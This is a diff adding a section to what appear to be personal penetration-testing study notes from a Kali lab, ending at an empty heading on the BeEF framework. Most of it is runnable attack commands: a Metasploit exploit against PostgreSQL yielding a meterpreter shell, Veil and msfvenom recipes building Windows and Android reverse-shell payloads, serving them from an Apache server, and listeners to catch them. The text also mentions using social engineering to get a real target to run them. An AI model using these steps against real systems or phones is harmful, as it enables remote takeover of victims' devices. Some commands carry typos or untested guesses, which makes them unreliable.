@@ -223,12 +223,245 @@ Check you have the root user
 whoami
 ```
 
+Discover the network with nmap
+```sh
+nmap 10.0.2.0/24
+```
+
+**PostgreSQL**
+
+Search metasploit for postgrsql
+```sh
+msfconsole
+```
+
+```sh
+search postgrsql
+```
+- Payload execution looks interesting. It has one for Linux and one for Windows.
+
+We can pick an exploit by doing the following command
+```sh
+use 11
+```
+
+Check the exploit options
+```sh
+show options
+```
+- The options show what needs to be set under the required column.
+- This particular exploit requires us to enter both our IP and the target IP. 
+
+Setting the required options
+```sh
+set LHOST <attcker-ip>
+```
+- You can also modify what port you want it to connect back on. The default is 4444
+
+```sh
+set RHOSTS <target-ip>
+```
+- There is also an option to set the RHOST port which may be required if it's not running on the usual port.
+
+```sh
+exploit
+```
+
+This gives a meterpreter shell. _I have a cheat sheet located in Kali > Tools > MultiTool_
+
+Get system info
+```sh
+sysinfo
+```
+
+---
+
+**Social Engineering and Malware Development**
+
+Tools: Veil-Framerwork
+
+Start Veil
+```sh
+veil
+```
+
+The two options you have at first are
+- Evasion - used for backdoors
+- Ordinance - creating payloads
+
+Get info on specific tool
+```sh
+info 1
+```
+
+Select the option required
+```sh
+use 1
+```
+
+Once inside the chosen tool you can list out the payloads
+```sh
+list
+```
+
+Select payload and view it's details
+```sh
+use 14
+```
+
+Set LHOST and LPORT (ifconfig)
+```sh
+set LHOST <attacker-ip>
+```
+
+```sh
+set LPORT 4444
+```
+- We can use `options` to verify that the payload has been updated
+
+If everything looks good you can generate the payload
+```sh
+generate
+```
+- It will ask you to choose a name and then start generating the payload
+- It then displays the output locations of the new payload
+
+Press enter to go back to the payload screen, or exit to quit from Veil.
+
+You can put the file in your Kali server so that you can access it easily while exploiting a sysytem or redirect a target to the Kali server that is serving the new payload. `var/www/html/payload.exe`
+
+Using it with Metasploit:
+```sh
+msfconsole
+```
+
+```sh
+use exploit/multi/handler
+```
+
+```sh
+set PAYLOAD windows/meterpreter/reverse_http
+```
+
+```sh
+show options
+```
+
+```sh
+set LHOSTS <attacker-ip>
+```
+
+```sh
+exploit
+```
+
+Start apache2 server
+```sh
+sudo service apache2 start
+```
+
+Now if we use the Windows VM and go to the server `<attacker-ip/payload.exe>` it will automatically download the file.
+
+If the user clicks to run the program it will open a meterpreter shell on our Kali machine.
+
+Background the meterpreter shell
+```sh
+background
+```
+
+Re-launch the session
+```sh
+sessions -i 1
+```
+- i - id number
 
 
+**MSFVenom**
 
+Create windows payload in MSFVenom
+```sh
+sudo msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=<attacker-ip> LPORT=4444 -o /home/payloads/payload.exe
+```
+- Once again we can copy this into our server for easy access.
 
+Move into server
+```sh
+sudo mv /home/payloads/payload.exe /var/www/html/payloads/
+```
 
+Set up the listener 
+```sh
+msfconsole
+```
 
+```sh
+use exploit/multi/handler
+```
 
+```sh
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
+
+```sh
+set LHOSTS <attacker-ip>
+```
+
+You can use the `help` command to list what meterpreter can do
+
+---
+
+**Hacking an Android phone**
+
+Tools: Vysor
+
+You need to change the network from Nat Network to Bridged Adaptor so it can identify the Android phone.
+
+Find the Android device
+```sh
+sudo netdiscover -i eth0 -r <attacker-ip>
+```
+
+Find out the Android devices IP by using termux listed under wlan0 It will also show the Kali machine's IP.
+
+Enable the Kali server so we can transfer files:
+```sh
+sudo service apach2 start
+```
+
+Create a payload 
+```sh
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -o /var/www/html/payloads/A51.apk
+```
+- Android extensions - .apk
+
+_This could be a wrong command but i'll add it so i can try it later_
+```sh
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 R > /var/www/html/payloads/A51.apk
+```
+- Maybe the capital R stands for redirect but i don't know until i try it.
+
+Open Metasploit and set-up a listener but this time for an Android device:
+```sh
+msfconsole
+```
+
+```sh
+use exploit/multi/handler
+```
+
+```sh
+set PAYLOAD android/meterpreter/reverse_tcp
+```
+- payload is not case sensitive so you don't have to make it all caps, it will still work in lowercase
+
+Again we check options to see what needs to be set. Then set the LHOST as the attacker IP. Exploit to start the listener.
+
+Now if we navigate to the Kali sever and download the file (we would need to use something like social engineering if this was a real target) we can run it and get the meterpreter shell.
+
+After installing the file you can run the App which is called MainActivity.  
+
+---
+
+**BeEF Framework**
 
 
